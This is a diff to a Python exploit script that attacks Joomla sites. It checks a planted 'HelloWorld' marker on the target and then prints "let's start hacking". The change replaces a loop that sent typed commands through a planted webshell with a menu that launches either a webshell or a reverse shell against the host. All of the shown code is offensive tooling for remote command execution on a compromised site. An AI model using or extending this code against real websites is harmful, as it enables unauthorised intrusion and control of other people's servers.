@@ -91,20 +91,24 @@ def put_exploit_joomla(url):
     
     if "HelloWorld" in response.content.decode('utf-8'):
         print("[+] Open input user, let's start hacking")
-        print("Enter a (web)shell command (type 'exit' to quit): ")
+
         while True:
-            user_cmd = input()
+            print("Which mode are you choosing ? [1]: Webshell, [2]: Reverseshell :")
+            user_choice = input()
 
-            if user_cmd.lower() == 'exit':
-                break
+            match user_choice:
+                case '1':
+                    print('[+] Webshell')
+                    webshell_joomla(host)
+                case '2':
+                    print('[+] Reverseshell')
+                    reverse_shell_joomla(host)
+                case _:
+                    print('[!] select a mode!')
 
-            new_url = f"{host}{user_cmd}"
-            response = requests.get(new_url)
-
-            if response.content.decode('utf-8').strip():
-                print(response.content.decode('utf-8').rstrip())
     else:
         print("[!] Can't open a webshell")
+        print("[-] Can't open a shell")
 
         
 
